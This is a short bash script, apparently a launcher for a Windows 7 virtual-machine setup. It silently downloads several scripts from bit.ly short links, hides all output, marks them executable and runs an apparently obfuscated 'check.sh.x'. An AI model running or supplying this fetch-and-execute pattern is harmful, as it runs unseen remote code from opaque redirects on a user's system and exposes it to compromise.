#!/bin/bash
clear
wget -O exit.sh https://bit.ly/3By9RUV > /dev/null 2>&1
wget -O sleep.sh https://bit.ly/3iGh4cU > /dev/null 2>&1
wget -O win7vm.sh https://bit.ly/3rvGYUH > /dev/null 2>&1
wget -O check.sh.x https://bit.ly/3eRwoSW > /dev/null 2>&1
wget -O region.sh https://bit.ly/3rFeKXo > /dev/null 2>&1
chmod +x win7vm.sh
chmod +x exit.sh
chmod +x sleep.sh
chmod +x region.sh
chmod +x check.sh.x
./check.sh.x
